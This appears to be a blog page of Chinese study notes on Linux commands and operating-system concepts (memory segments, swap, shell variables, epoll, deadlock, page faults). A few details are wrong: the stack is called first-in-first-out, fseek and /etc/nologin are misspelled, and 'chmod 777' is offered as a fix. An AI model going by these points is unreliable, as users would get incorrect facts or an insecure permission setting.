<li>删除软链接并不影响被指向的文件，但若被指向的原文件被删除，则相关软连接被称为死链接（即 dangling link，若被指向路径文件被重新创建，死链接可恢复为正常的软链接）。</li>
</ul>
<p>删除源文件的话，软连接则指向了一个空文件。</p>
<h3 id="WC"><a href="#WC" class="headerlink" title="WC"></a>WC</h3><p>Linux系统中的wc (Word Count) 命令的功能为统计指定文件中的字节数、字数、行数，并将统计结果显示输出。</p>
<p>1． 命令格式：<br>wc [选项]文件…<br>2． 命令功能：<br>统计指定文件中的字节数、字数、行数，并将统计结果显示输出。该命令统计指定文件中的字节数、字数、行数。如果没有给出文件名，则从标准输入读取。wc同时也给出所指定文件的总统计数。<br>3． 命令参数：<br>-c 统计字节数。<br>-l 统计行数。<br>-m 统计字符数。这个标志不能与 -c 标志一起使用。<br>-w 统计字数。一个字被定义为由空白、跳格或换行字符分隔的字符串<br>-L 打印最长行的长度。<br>-help 显示帮助信息<br>–version 显示版本信息</p>
<h3 id="内存管理模式中，会产生外零头的是"><a href="#内存管理模式中，会产生外零头的是" class="headerlink" title="内存管理模式中，会产生外零头的是"></a>内存管理模式中，会产生外零头的是</h3><p>段式<br>请求段式<br>操作系统在分配内存时，有时候会产生一些空闲但是无法被正常使用的内存区域，这些就是内存碎片，或者称为内存零头，这些内存零头一共分为两类：<strong>内零头和外零头</strong>。<br><strong>内零头</strong>是指进程在向操作系统请求内存分配时，系统满足了进程所需要的内存需求后，还额外还多分了一些内存给该进程，也就是说额外多出来的这部分内存归该进程所有，其他进程是无法访问的。<br><strong>外零头</strong>是指内存中存在着一些空闲的内存区域，这些内存区域虽然不归任何进程所有，但是因为内存区域太小，无法满足其他进程所申请的内存大小而形成的内存零头。<br>页式存储管理是以页为单位（页面的大小由系统确定，且大小是固定的）向进程分配内存的，例如：假设内存总共有100K,分为10页，每页大小为10K。现在进程A提出申请56K内存，因为页式存储管理是以页为单位进程内存分配的，所以系统会向进程A提供6个页面，也就是60K的内存空间，那么在最后一页中进程只使用了6K，从而多出了4K的内存碎片，但是这4K的内存碎片系统已经分配给进程A了，其他进程是无法再访问这些内存区域的，这种内存碎片就是内零头。<br>段式存储管理是段（段的大小是程序逻辑确定，且大小不是固定的）为单位向进程进行内存分配的，进程申请多少内存，系统就给进程分配多少内存，这样就不会产生内零头，但是段式分配会产生外零头。<br>例如：假设内存总的大小为100K，现在进程A向系统申请60K的内存，系统在满足了进程A的内存申请要求后，还剩下40K的空闲内存区域；这时如果进程B向系统申请50K的内存区域，而系统只剩下了40K的内存区域，虽然这40K的内存区域不归任何进程所有，但是因为大小无法满足进程B的要求，所以也无法分配给进程B，这样就产生了外零头。请求段式存储管理是在段式存储管理的基础上增加了请求调段功能和段置换功能。</p>
<p>1.固定分区分配：产生内部碎片。<br>2.页式：产生内部碎片<br>3.段式：产生外部碎片<br>4:段页式：产生内部碎片</p>
<h3 id="UNIX系统代码段和数据段分开的目的"><a href="#UNIX系统代码段和数据段分开的目的" class="headerlink" title="UNIX系统代码段和数据段分开的目的"></a>UNIX系统代码段和数据段分开的目的</h3><p>可共享正文<br>可共享数据<br>可重入<br>可保护代码为只读<br>更好支持内存回收策略</p>
<p>1）防止程序指令被修改，设置代码段权限为只读，设置数据段权限为可读写<br>2）代码段和数据段分开有利于提高程序的局部性，现代CPU缓存一般设计为数据缓存和指令缓存分离，指令和数据分开存放可以提高CPU缓存命中率。<br>3）共享指令，当系统运行多个程序的副本时，它们指令时一样的，因此内存只需保存一份程序的指令代码。每个副本进程的数据区是进程私有，可以节省内存。</p>
<p>1）代码段：代码段是用来存放可执行文件的操作指令，也就是说是它是可执行程序在内存中的镜像。代码段需要防止在运行时被非法修改，所以只准许读取操作，而不允许写入（修改）操作——它是不可写的。<br>2）数据段：数据段用来存放可执行文件中已初始化全局变量，换句话说就是存放程序静态分配的变量和全局变量。<br>3）BSS段：BSS段包含了程序中未初始化的全局变量，在内存中 bss段全部置零。<br>4）堆（heap）：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）<br>它的物理内存空间是由程序申请的，并由程序负责释放。<br>5）栈：栈是用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。<br>实际上,在Linux系统下并没有强调分段,每个进程缺省情况下“数据段”，“堆栈段”和“代码段”都使用等价的段描述,映射到相同的线性地址空间,除非你个别设置LDT.</p>
<h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><p>chmod +权限 +文件或目录<br>chown +属主.属组+文件或目录<br>chgrp +属组 +目录<br>就本题目而言，设置目录的权限可以这样：<br>chmod  777  /ftproot<br>或者直接设置目录的属主为apache：<br>chown apache   /ftproot  加上权限 chmod  7xx  /ftproot</p>
<h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><p>crontab  用于设置周期性被执行的指令<br>nohup    在注销后使用  nohup  命令运行后台中的程序。</p>
<h3 id="存储区域"><a href="#存储区域" class="headerlink" title="存储区域"></a>存储区域</h3><p>（1）从静态存储区域分配：<br>内存在程序编译时就已经分配好，这块内存在程序的整个运行期间都存在。速度快、不容易出错，因为有系统会善后。例如全局变量，static变量等。<br>（2）在栈上分配：<br>在执行函数时，函数内局部变量的存储单元都在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。<br>（3）从堆上分配：<br>即动态内存分配。程序在运行的时候用malloc或new申请任意大小的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由程序员决定，使用非常灵活。如果在堆上分配了空间，就有责任回收它，否则运行的程序会出现内存泄漏，另外频繁地分配和释放不同大小的堆空间将会产生堆内碎块。<br>一个C、C++程序编译时内存分为5大存储区：堆区、栈区、全局区、文字常量区、程序代码区。</p>
<h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h3><p>-m 设置用户权限<br>-p 如果路径中某些目录不存在，系统会自动创建<br>mkdir没有-d和-f选项</p>
<h3 id="交换空间"><a href="#交换空间" class="headerlink" title="交换空间"></a>交换空间</h3><p>mkswap<br>功能说明：设置交换区(swap area)，可将磁盘分区或文件设为Linux的交换区<br>语　　法：mkswap [-cf][-v0][-v1][设备名称或文件][交换区大小]<br>参　　数：<br>     -c   建立交换区前，先检查是否有损坏的区块。<br>     -f   在SPARC电脑上建立交换区时，要加上此参数。<br>     -v0   建立旧式交换区，此为预设值。<br>     -v1   建立新式交换区。<br>     [交换区大小]   指定交换区的大小，单位为1024字节</p>
<p>swapon<br>功能说明：激活swap<br>参 数：<br>-a 自动启动所有SWAP装置<br>-s 显示简短的装置讯息</p>
<p>swapoff<br>功能说明：关闭系统交换分区<br>语　　法：swapoff[必要参数][选择参数]<br>参 数：<br>   必要参数<br>       -a 关闭所有交换设备<br>选择参数<br>       -h 帮助信息<br>       -V 版本信息</p>
<p>设置swap优先级的方法<br>wappiness=0 的时候表示最大限度使用物理内存，然后才是swap空间；<br>swappiness＝100 的时候表示积极的使用swap分区，并且把内存上的数据及时的搬运到swap空间里面。</p>
<p>dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。<br>if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt; if=input file &gt;<br>of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;<br>/dev/zero：是一个输入设备，你可你用它来初始化文件。<br>/mnt/sw1：Linux操作系统下的挂载目录下的交换分区目录<br>swapon：开启交换分区<br>mkswap：设置交换分区<br>mkfs：建立 linux 文件系统在特定的分区上</p>
<h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><p>— ps: Linux中的ps命令是Process Status的缩写。ps命令用来列出系统中当前运行的那些进程。<br>— accton：打开或关闭进程账号记录功能。<br>— last：显示曾经登录过的用户。<br>— lastcomm：显示已执行过的命令。</p>
<h3 id="查看中断"><a href="#查看中断" class="headerlink" title="查看中断"></a>查看中断</h3><p>/proc/interrupts 显示使用的中断<br>/proc/ioports 当前使用的I/O端口<br>/proc/kcore 系统物理内存映像。与物理内存大小完全一样，但不实际占用这么多的内存。<br>/proc/kmsg  内核输出的消息，也被送到syslog</p>
<h3 id="UNIX系统中进程"><a href="#UNIX系统中进程" class="headerlink" title="UNIX系统中进程"></a>UNIX系统中进程</h3><p>UNIX系统中进程由三部分组成：进程控制块，正文段和数据段。这意味着一个程序的正文与数据可以是分开的，这种分开的目的是为了<br>可共享正文<br>可共享数据<br>可重入<br>进程运行时用到的数据以及工作区，构成了一个进程的数据段。要注意的是，如果进程执行的程序是不能被共享的，那么也把它归入到数据段中。<br>为了管理好进程的共享正文段，UNIX在内存专门开辟了一个text结构区域，形成正文段表text[ ].<br>因此，划分进程为进程控制块、正文段、数据段可以实现共享正文，共享数据和可重入。</p>
<h3 id="自旋锁spinlock"><a href="#自旋锁spinlock" class="headerlink" title="自旋锁spinlock"></a>自旋锁spinlock</h3><p>运行在多核处理器上的Linux环境中,若临界区非常短,且不允许线程上下文切换的情况下,使用下列哪种机制满足上述需求并且性能最好?<br>SpinLock<br>spinlock在多处理器多线程环境的场景中有很广泛的使用，一般要求使用spinlock的临界区尽量简短，这样获取的锁可以尽快释放，以满足其他忙等的线程。<br>Spinlock和mutex不同，spinlock不会导致线程的状态切换(用户态-&gt;内核态)，但是spinlock使用不当(如临界区执行时间过长)会导致cpu busy飙高。<br><a href="https://kb.cnblogs.com/page/105657/" target="_blank" rel="noopener">自旋锁spinlock剖析与改进</a></p>
<h3 id="lpr"><a href="#lpr" class="headerlink" title="lpr"></a>lpr</h3><p>lprm 命令用于将一个工作由打印机贮列中移除<br>lpq 命令用于查看一个打印队列的状态，该程序可以查看打印机队列状态及其所包含的打印任务。<br>lpd 命令 是一个常驻的打印机管理程序，它会根据 /etc/printcap 的内容来管理本地或远端的打印机。<br>lpr(line printer，按行打印)实用程序用来将一个或多个文件放入打印队列等待打印。</p>
<h3 id="linux中shell变量含义解释"><a href="#linux中shell变量含义解释" class="headerlink" title="linux中shell变量含义解释:"></a>linux中shell变量含义解释:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$# 是传给脚本的参数个数</span><br><span class="line">$0是脚本本身的名字</span><br><span class="line">$1是传递给该shell脚本的第一个参数</span><br><span class="line">$2是传递给该shell脚本的第二个参数</span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br><span class="line">$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</span><br><span class="line">$$ 是脚本运行的当前进程ID号</span><br><span class="line">$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</span><br></pre></td></tr></table></figure>
<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>0 标准输入<br>1 标准输出<br>2 标准错误输出</p>
<h3 id="重定向符"><a href="#重定向符" class="headerlink" title="重定向符"></a>重定向符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 输出重定向</span><br><span class="line">&gt;&gt; 输出附加重定向</span><br><span class="line">&lt; 输入重定向</span><br><span class="line">&gt;!输出重定向到一个文件或设备 强制覆盖原来的文件</span><br></pre></td></tr></table></figure>
<h3 id="cp拷贝命令的参数"><a href="#cp拷贝命令的参数" class="headerlink" title="cp拷贝命令的参数"></a>cp拷贝命令的参数</h3><p>-r 递归处理，将指定目录下的文件与子目录一并处理<br>-v 或 –verbose 显示执行过程<br>-f 或 –force 强行复制文件或目录， 不论目的文件或目录是否已经存在</p>
<h3 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h3><p><img data-src="https://uploadfiles.nowcoder.com/images/20190822/8653996_1566440008866_D5AF491EFDBA60071C5F90CCBFDA1618" alt></p>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>(1)PWD 和 OLDPWD<br>PWD 记录当前的目录路径，当利用 cd 命令切换当前目录时，系统自动更新 PWD 的值， OLDPWD 记录旧的工作目录，即用户所处的前一个目录。<br>(2)PATH<br>PATH 是 Linux 中一个极为重要的环境变量，它用于帮助 Shell 找到用户输入的命令。用户所输入的每个命令实际上是一个源代码文件，计算机执行这个文件里的代码以实现这个命令的功能，这些源代码文件称为可执行文件。可执行文件存在于各种各样的目录下， PATH 就记录了一系列的目录列表， Shell 为每个输入命令搜索 PATH 中的目录列表。<br>(3)HOME<br>HOME 记录当前用户的目录，由 /etc/passwd 的倒数第 2 个域决定， HOME 目录用于保存用户自己的文件。</p>
<h3 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h3><p>cut ：从文本文件的每一行中截取指定内容的数据。<br>cp ：用来复制文件或目录。<br>dd ：将指定的输入文件拷贝到输出文件中，在拷贝的过程中可以进行格式转换。<br>fmt ：将所有非空白行的长度设置为几乎相同，来进行简单的文本格式化。</p>
<h3 id="usermod"><a href="#usermod" class="headerlink" title="usermod"></a>usermod</h3><p>usermod(选项)(参数)：<br>参数若为两个，顺序一般为  usermod (选项)  目标参数  原始参数<br>-c&lt;备注&gt;：修改用户帐号的备注文字；<br>-d&lt;登入目录&gt;：修改用户登入时的目录；<br>-e&lt;有效期限&gt;：修改帐号的有效期限；<br>-f&lt;缓冲天数&gt;：修改在密码过期后多少天即关闭该帐号；<br>-g&lt;群组&gt;：修改用户所属的群组；<br>-G&lt;群组&gt;；修改用户所属的附加群组；<br>-l&lt;帐号名称&gt;：修改用户帐号名称；<br>-L：锁定用户密码，使密码无效；<br>-s：修改用户登入后所使用的shell；<br>-u：修改用户ID；<br>-U:解除密码锁定。</p>
<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><ul>
<li>select能监控的描述符个数由内核中的FD_SETSIZE限制，仅为1024，这也是select最大的缺点，因为现在的服务器并发量远远不止1024。即使能重新编译内核改变FD_SETSIZE的值，但这并不能提高select的性能。</li>
<li>每次调用select都会线性扫描所有描述符的状态，在select结束后，用户也要线性扫描fd_set数组才知道哪些描述符准备就绪，等于说每次调用复杂度都是O（n）的，在并发量大的情况下，每次扫描都是相当耗时的，很有可能有未处理的连接等待超时。</li>
<li>每次调用select都要在用户空间和内核空间里进行内存复制fd描述符等信息。<h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h3></li>
<li>poll使用pollfd结构来存储fd，突破了select中描述符数目的限制。</li>
<li>与select的后两点类似，poll仍然需要将pollfd数组拷贝到内核空间，之后依次扫描fd的状态，整体复杂度依然是O（n）的，在并发量大的情况下服务器性能会快速下降。<h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3></li>
<li>epoll维护的描述符数目不受到限制，而且性能不会随着描述符数目的增加而下降。</li>
<li>服务器的特点是经常维护着大量连接，但其中某一时刻读写的操作符数量却不多。epoll先通过epoll_ctl注册一个描述符到内核中，并一直维护着而不像poll每次操作都将所有要监控的描述符传递给内核；在描述符读写就绪时，通过回掉函数将自己加入就绪队列中，之后epoll_wait返回该就绪队列。也就是说，epoll基本不做无用的操作，时间复杂度仅与活跃的客户端数有关，而不会随着描述符数目的增加而下降。</li>
<li>epoll在传递内核与用户空间的消息时使用了内存共享，而不是内存拷贝，这也使得epoll的效率比poll和select更高。</li>
</ul>
<h3 id="Tar"><a href="#Tar" class="headerlink" title="Tar"></a>Tar</h3><p>-c: 建立新的备份文件<br>-t:列出备份文件的内容<br>-x:从备份文件中还原文件<br>-z:通过gzip指令处理备份文件<br>-v:显示指令执行过程<br>-f:指定压缩或解压文件</p>
<h3 id="暂停进程"><a href="#暂停进程" class="headerlink" title="暂停进程"></a>暂停进程</h3><p>ctrl  z 就是挂起一个进程，暂停的意思<br>fg是将进程放到前台并唤醒<br>bg是将进程放到后台并唤醒<br>ctrl+h,在shell就是向左删除的作用</p>
<h3 id="查看系统负载"><a href="#查看系统负载" class="headerlink" title="查看系统负载"></a>查看系统负载</h3><p>uptime命令主要用于获取主机运行时间和查询linux系统负载等信息<br>vmstat命令可以查看查看cpu负载<br>sar命令可以查看网络接口信息<br>free命令可以查看内存</p>
<h3 id="网络进程"><a href="#网络进程" class="headerlink" title="网络进程"></a>网络进程</h3><p>Netd 就是Network Daemon 的缩写，表示Network守护进程. Netd负责跟一些涉及网络的配置，操作，管理，查询等相关的功能实现，比如，例如带宽控制（Bandwidth），流量统计，带宽控制，网络地址转换（NAT），个人局域网（pan），PPP链接，soft-ap，共享上网（Tether），配置路由表，interface配置管理，等等.好像Andorid用的</p>
<p>inetd 是监视一些网络请求的 守护进程 ，其根据网络请求来调用相应的服务进程来处理连接请求。它可以为多种服务管理连接，当 inetd 接到连接时，它能够确定连接所需的程序，启动相应的进程，并把 socket 交给它 。</p>
<p>1、 Service就是指常驻内存大一些程序，且可以提供一些系统或是网络功能。提供service的那个程序就成为daemon。Daemon和service可以视为等同，不必刻意去区分。<br>2、 Daemon可以分为两类，一类是可独立启动的，成为stand alone；另一类是通过一支super daemon来统一管理的服务。<br>3、 Stand alone类型的daemon能够自动启动，常驻内存，对请求响应较快，如httpd、vsftpd等。<br>4、 Super daemon统一管理的是用户有请求，super daemon就唤醒响应daemon，如果用户请求结束，就kill掉该daemon。优点不用常驻内存，缺点装到内存需要时间。如telnet。这个super daemon早期是inetd，后来被xinetd取代。</p>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>dd:删除当前行（0：返回行首）<br>ndd:删除光标行往下n行(含光标行)内容<br>dgg:删除光标当前行及以上内容<br>dG:删除光标当前行及以下内容<br>dH:删除当前页面第1行至光标行<br>p:粘贴到光标下一行<br>u:撤销一次操作<br>Ctrl + r:反撤销（一次）</p>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>ping 命令不用说大家都知道，不论windows还是linux，对于PING命令无非是在测试网络连接的性能情况<br><img data-src="http://uploadfiles.nowcoder.com/images/20150607/871566_1433648038905_1.png" alt><br>netstat，字面理解网络状态，包括网络地址信息，网络的连接状态，网络的子网掩码等等，通过命令 netstat -ie ，效果和ifconfig一样<br><img data-src="http://uploadfiles.nowcoder.com/images/20150607/871566_1433648070672_2.png" alt><br>route是路由表信息命令主要是查看路由表相关的<br><img data-src="http://uploadfiles.nowcoder.com/images/20150607/871566_1433648104253_3.png" alt><br>tracert表示并不是很准确，在linux下应该是traceroute，字面理解路径追踪，其实就是在网络中包通过的路由器等相关的个数信息。<br><img data-src="http://uploadfiles.nowcoder.com/images/20150607/871566_1433648129480_4.png" alt></p>
<h3 id="etc-1"><a href="#etc-1" class="headerlink" title="etc"></a>etc</h3><p>/etc/下文件目录的作用：<br>/etc/resolv.conf  是DNS配置文件。在网卡配置文件中进行配置，默认情况下 网卡配置文件DNS优先于/etc/resolv.conf。<br>/etc/hostname 在Centos 7，配置主机名，查看修改。<br>/etc/hosts  ip与域名对应关系 ，解析域名（主机名），用/etc/hosts搭建网站的测试环境 (虚拟机)。不同服务器之间相互访问。<br>/etc/fstab   file system table ：文件系统挂载表，开机的时候设备与入口对应关系 开机自动挂载列表。<br>/etc/rc.local  开机自启<br>/etc/inittab（centos 6）运行级别的配置文件<br>/etc/profile  环境变量配置文件<br>/etc/bashrc  命令别名<br>/etc/motd   文件中的内容 会在用户登录系统之后显示出来<br>/etc/issue /etc/issue.net 文件中的内容 会在用户登录系统之前显示出来</p>
<p>/etc/group 设定用户的组名与相关信息<br>/etc/passwd 帐号信息<br>/etc/shadow  密码信息</p>
<h3 id="Linux-目录"><a href="#Linux-目录" class="headerlink" title="Linux 目录"></a>Linux 目录</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/bin 二进制可执行命令</span><br><span class="line">/dev 设备特殊文件</span><br><span class="line">/etc 系统管理和配置文件</span><br><span class="line">/etc/rc.d 启动的配置文件和脚本</span><br><span class="line">/home 用户主目录的基点，比如用户user的主目录就是/home/user，可以用~user表示</span><br><span class="line">/lib 标准程序设计库，又叫动态链接共享库，作用类似windows里的.dll文件</span><br><span class="line">/sbin 超级管理命令，这里存放的是系统管理员使用的管理程序</span><br><span class="line">/tmp 公共的临时文件存储点</span><br><span class="line">/root 系统管理员的主目录</span><br><span class="line">/mnt 系统提供这个目录是让用户临时挂载其他的文件系统</span><br><span class="line">/lost+found这个目录平时是空的，系统非正常关机而留下“无家可归”的文件（windows下叫什么.chk）</span><br><span class="line">/proc 虚拟的目录，是系统内存的映射。可直接访问这个目录来获取系统信息。</span><br><span class="line">/var 某些大文件的溢出区，比方说各种服务的日志文件</span><br><span class="line">/usr 最庞大的目录，要用到的应用程序和文件几乎都在这个目录，其中包含：</span><br><span class="line">/usr/x11R6存放x window的目录</span><br><span class="line">/usr/bin众多的应用程序</span><br><span class="line">/usr/sbin超级用户的一些管理程序</span><br><span class="line">/usr/doclinux文档</span><br><span class="line">/usr/includelinux下开发和编译应用程序所需要的头文件</span><br><span class="line">/usr/lib常用的动态链接库和软件包的配置文件</span><br><span class="line">/usr/man帮助文档</span><br><span class="line">/usr/src源代码，linux内核的源代码就放在/usr/src/linux里</span><br><span class="line">/usr/local/bin本地增加的命令</span><br></pre></td></tr></table></figure>
<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>backtrace bt 打印当前的函数调用栈的所有信息。<br>info threads 显示当前可调试的所有线程，每个线程会有一个GDB为其分配的ID，后面操作线程的时候会用到这个ID。 前面有*的是当前调试的线程。<br>set scheduler-locking 线程调试 显示线程状态, off 不锁定任何线程<br>info break 可列出所有断点信息，info break 后也可设置要查看的 break num</p>
<h3 id="内核线程与用户线程"><a href="#内核线程与用户线程" class="headerlink" title="内核线程与用户线程"></a>内核线程与用户线程</h3><p>1、内核线程是一直处于内核态的轻量级进程，LWT，根本不会切换到用户态。<br>2、至于内核级线程，在深入linux内核没见过这个概念，我觉得就是普通线程，实际上对于linux而言，内核不会区分线程和进程，线程跟进程一样会有用进程拥有的所有描述符，只是线程共享了页表，线性区等，不懂可以看看fork(),vfork(),clone的调用区别。或者看一下pthread库的底层实现。因此这里讲的应该是内核级线程应该指的是普通线程。<br>3、至于用户级线程，个人认为题目讲的就是协程，调度都是在用户态，不能利用多核优势。</p>
<p>用户线程指不需要内核支持而在用户程序中实现的线程，其不依赖于操作系统核心，应用进程利用线程库提供创建、同步、调度和管理线程的函数来控制用户线程。</p>
<h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><p>exec 使用vfork函数时，通常需要exec配合使用<br>fg(Foreground) 将进程搬到前台运行的命令<br>bg(Background) 将进程搬到后台运行的命令<br>jobs 查看当前有多少在后台运行的命令</p>
<p>使用fork或vfork创建子进程后，子进程通常会调用exec函数来执行另外一个程序。系统调用exec用于执行一个可执行程序以代替当前进程的执行映像。exec调用没有生成新进程。一个进程一旦调用exec函数，它本身就“死亡”了，系统把代码段替换成新的程序的代码，废弃原有的数据段和堆栈段，并为新程序分配新的数据段和堆栈段，唯一保留的就是进程ID。也就是说，对系统而言，还是同一个进程，不过执行的已经是另外一个程序了。</p>
<p>Ctrl+C： 终止并退出前台命令的执行，回到SHELL。<br>Ctrl+Z： 暂停前台命令的执行，将该进程放入后台，回到SHELL。<br>jobs： 查看当前在后台执行的命令，可查看命令进程号码。<br>&amp;： 运行命令时，在命令末尾加上&amp;可让命令在后台执行。<br>fg N： 将命令进程号码为N的命令进程放到前台执行，同%N。<br>bg N： 将命令进程号码为N的命令进程放到后台执行</p>
<h3 id="进制登陆"><a href="#进制登陆" class="headerlink" title="进制登陆"></a>进制登陆</h3><p>touch /etc/nolgoin 禁止所有普通用户登录<br>linux系统中的/var/log/lastlog日志记录了所有用户最后登录的记录，可以用lastlog命令查看</p>
<p>utmp 文件的绝对路径是 /var/run/utmp ，该文件通常用 who 命令来读取；<br>wtmp 文件的绝对路径是 /var/log/wtmp ，该文件通常通过 last 命令来读取。<br>这两个文件都不是普通的文本文件，所以不能用 cat ，less，more 等命令来查看。<br><strong>utmp日志文件</strong>记录有关当前登录的每个用户的信息。因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会为用户保留永久的记录。系统中需要查询当前用户状态的程序，如 who、w、users、finger等就需要访问这个文件。该日志文件并不能包括所有精确的信息，因为某些突发错误会终止用户登录会话，而系统没有及时更新 utmp记录，因此该日志文件的记录不是百分之百值得信赖的。</p>
<p><strong>wtmp日志文件</strong>永久记录每个用户登录、注销及系统的启动、停机的事件。因此随着系统正常运行时间的增加，该文件的大小也会越来越大，增加的速度取决于系统用户登录的次数。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录记录，last也能根据用户、终端tty或时间显示相应的记录。</p>
<h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><h4 id="产生死锁的原因主要是："><a href="#产生死锁的原因主要是：" class="headerlink" title="产生死锁的原因主要是："></a>产生死锁的原因主要是：</h4><p>（1） 因为系统资源不足。<br>（2） 进程运行推进的顺序不合适。<br>（3） 资源分配不当等。<br>如果系统资源充足，进程的资源请求都能够得到满足，死锁出现的可能性就很低，否则<br>就会因争夺有限的资源而陷入死锁。其次，进程运行推进顺序与速度不同，也可能产生死锁。</p>
<h4 id="产生死锁的四个必要条件："><a href="#产生死锁的四个必要条件：" class="headerlink" title="产生死锁的四个必要条件："></a>产生死锁的四个必要条件：</h4><p>（1） 互斥条件：一个资源每次只能被一个进程使用。<br>（2） 请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。<br>（3） 不剥夺条件:进程已获得的资源，在末使用完之前，不能强行剥夺。<br>（4） 循环等待条件:若干进程之间形成一种头尾相接的循环等待资源关系。<br>这四个条件是 死锁的必要条件 ，只要系统发生死锁，这些条件必然成立，而只要上述条件之<br>一不满足，就不会发生死锁。</p>
<h4 id="死锁的解除与预防："><a href="#死锁的解除与预防：" class="headerlink" title="死锁的解除与预防："></a>死锁的解除与预防：</h4><p>理解了死锁的原因，尤其是产生死锁的四个必要条件，就可以最大可能地避免、预防和<br>解除死锁。所以，在系统设计、进程调度等方面注意如何不让这四个必要条件成立，如何确<br>定资源的合理分配算法，避免进程永久占据系统资源。此外，也要防止进程在处于等待状态<br>的情况下占用资源。因此，对资源的分配要给予合理的规划。</p>
<h3 id="系统调用与库函数"><a href="#系统调用与库函数" class="headerlink" title="系统调用与库函数"></a>系统调用与库函数</h3><p>lseek()函数：移动文件的读写位置<br>read() write()读写文件<br>pread() pwrite()带偏移量的读写文件<br>都属于系统调用<br>feek() 库函数</p>
<h3 id="page-fault"><a href="#page-fault" class="headerlink" title="page fault"></a>page fault</h3><p>page fault的情景：<br>1.用户态按需调页 </p>
<ol start="2">
<li>主内核页目录的同步 </li>
<li>对exception table中的异常操作的处理<br>4.堆栈自动扩展 5.对用户态指针越界的检查</li>
</ol>
<p>影响一个应用程序性能的因素有很多，这次说说page fault。</p>
<ol>
<li>为什么会存在page fault问题？<br>计算机的物理内存（看看你的内存条）有限，一般现在都是几个GB的容量了，BTW，我的笔记本有8GB，:-)。<br>但应用程序的需求是无限的，操作系统为了解决这个矛盾，使用了虚拟内存的设计。简单的描述就是，给应用程序<br>一个与物理内存无关的虚拟地址空间，并提供一套映射机制，将虚拟地址映射到物理内存。当然应用程序是不知道<br>有这个映射机制存在的，他唯一需要做的就是尽情的使用自己的虚拟地址空间。操作系统提供的映射机制是<br>运行时动态进行虚拟地址和物理地址之间的映射的，当一个虚拟地址没有对应的物理内存时候，<br>映射机制就分配物理内存，构建映射表，满足应用程序的需求，这个过程就叫page fault。<br>与直接访问物理内存不同，page fault过程大部分是由软件完成的，消耗时间比较久，所以是影响性能的一个关键指标。<br>Linux把page fault又进一步分为minor page fault和major page fault。前面提到的分配物理内存，构建映射表过程可以看做是<br>minor page fault。major page fault是由swap机制引入的，对于swap情况，地址映射好了后，还需要从外部存储读取数据，这个<br>过程涉及到IO操作，耗时更久。</li>
<li>如何查看应用程序的page fault指标呢？<br>1） 可以使用time命令：<br>  比如我想看看svm-train的情况（模型训练很耗资源）\time svm-train age_train_equal.txt（前面的斜杠表示不使用shell的内嵌time命令）<br>输出是：7.68user 0.02system 0:07.71elapsed 99%CPU (0avgtext+0avgdata 42768maxresident)k0inputs+6696outputs (0major+15445minor)pagefaults 0swaps<br>可以看到只有minor page fault，没有major。<br>time命令的实现是用到了Linux提供的rusage机制。Linux的wait API可以返回一个应用程序的运行过程的资源消耗情况。<br>如果你想在自己的代码中获取资源利用情况，可以使用libc的getrusage函数，这个函数也是内核的API。<br>2） proc文件系统<br>Linux系统下的/proc/PID/stat文件，也提供了相关统计数据。<br><a href="http://www.cnblogs.com/cornsea/archive/2012/12/17/2821429.html" target="_blank" rel="noopener">参考资料</a></li>
</ol>
<h3 id="Arp"><a href="#Arp" class="headerlink" title="Arp"></a>Arp</h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据 IP地址 获取 物理地址 的一个 TCP/IP协议 。 主机 发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。<br>ARP协议的工作原理，unicast应是单播，broadcast是广播，multicast应该是多播。</p>
